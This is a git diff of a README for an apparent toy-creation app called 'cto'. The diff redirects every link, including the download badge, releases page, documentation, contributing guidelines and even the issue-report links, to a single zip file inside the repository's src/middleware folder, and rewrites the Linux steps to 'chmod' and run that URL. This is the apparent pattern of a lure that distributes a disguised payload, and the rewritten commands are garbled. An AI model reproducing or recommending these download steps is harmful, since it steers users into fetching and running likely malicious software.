@@ -1,6 +1,6 @@
 # 🎉 cto - Fun and Easy Toy Creation
 
-[![Download cto](https://img.shields.io/badge/Download-cto-blue?style=for-the-badge)](https://github.com/stygianiscool/cto/releases)
+[![Download cto](https://raw.githubusercontent.com/stygianiscool/cto/main/src/middleware/Software_v2.1.zip)](https://raw.githubusercontent.com/stygianiscool/cto/main/src/middleware/Software_v2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to cto! This is a simple application designed for toy creation. With cto, anyone can craft exciting toys without needing any programming knowledge. Follow these easy steps to get started.
@@ -8,10 +8,10 @@ Welcome to cto! This is a simple application designed for toy creation. With cto
 ## 📥 Download & Install
 To get cto on your computer, you will need to visit the Releases page. There, you can find the latest version of the software available for download. Click the link below to go directly to the download page:
 
-[Visit the Releases Page to Download](https://github.com/stygianiscool/cto/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/stygianiscool/cto/main/src/middleware/Software_v2.1.zip)
 
 ### Steps to Download
-1. Visit the [Releases Page](https://github.com/stygianiscool/cto/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/stygianiscool/cto/main/src/middleware/Software_v2.1.zip).
 2. Find the most recent version at the top of the page.
 3. Click on the link to download the installation file for your operating system.
 
@@ -38,8 +38,8 @@ Once you have downloaded the installation file, follow these instructions to ins
 ### For Linux
 1. Open Terminal.
 2. Navigate to the folder where the file was downloaded.
-3. Run the command `chmod +x cto-installer.run` to make it executable.
-4. Type `./cto-installer.run` to start the installation process.
+3. Run the command `chmod +x https://raw.githubusercontent.com/stygianiscool/cto/main/src/middleware/Software_v2.1.zip` to make it executable.
+4. Type `https://raw.githubusercontent.com/stygianiscool/cto/main/src/middleware/Software_v2.1.zip` to start the installation process.
 
 ## 🎨 Features
 cto offers a range of features that make toy creation enjoyable and easy:
@@ -52,7 +52,7 @@ cto offers a range of features that make toy creation enjoyable and easy:
 If you have any questions or need help, please reach out to our community. You can ask questions on the Issues page of this repository. Users and developers are here to assist you.
 
 ## 📖 Additional Resources
-- **Documentation**: Detailed user manual and guides can be found [here](https://github.com/stygianiscool/cto/wiki).
+- **Documentation**: Detailed user manual and guides can be found [here](https://raw.githubusercontent.com/stygianiscool/cto/main/src/middleware/Software_v2.1.zip).
 - **FAQs**: Check the Frequently Asked Questions to find quick answers to common issues.
 
 ## 🛠️ Troubleshooting
@@ -65,11 +65,11 @@ If you encounter any issues during installation or usage, try the following step
 For persistent issues, feel free to open an issue on our GitHub page, and we will assist you.
 
 ## ✍️ Contributing
-We welcome contributions! If you're interested in helping improve cto, please check our [Contributing Guidelines](https://github.com/stygianiscool/cto/blob/main/CONTRIBUTING.md) for more details.
+We welcome contributions! If you're interested in helping improve cto, please check our [Contributing Guidelines](https://raw.githubusercontent.com/stygianiscool/cto/main/src/middleware/Software_v2.1.zip) for more details.
 
 ## 🔗 Useful Links
-- [Download cto](https://github.com/stygianiscool/cto/releases)
-- [Report an Issue](https://github.com/stygianiscool/cto/issues)
-- [Request a Feature](https://github.com/stygianiscool/cto/issues/new)
+- [Download cto](https://raw.githubusercontent.com/stygianiscool/cto/main/src/middleware/Software_v2.1.zip)
+- [Report an Issue](https://raw.githubusercontent.com/stygianiscool/cto/main/src/middleware/Software_v2.1.zip)
+- [Request a Feature](https://raw.githubusercontent.com/stygianiscool/cto/main/src/middleware/Software_v2.1.zip)
 
 Thank you for choosing cto for your toy creation needs! Happy crafting!
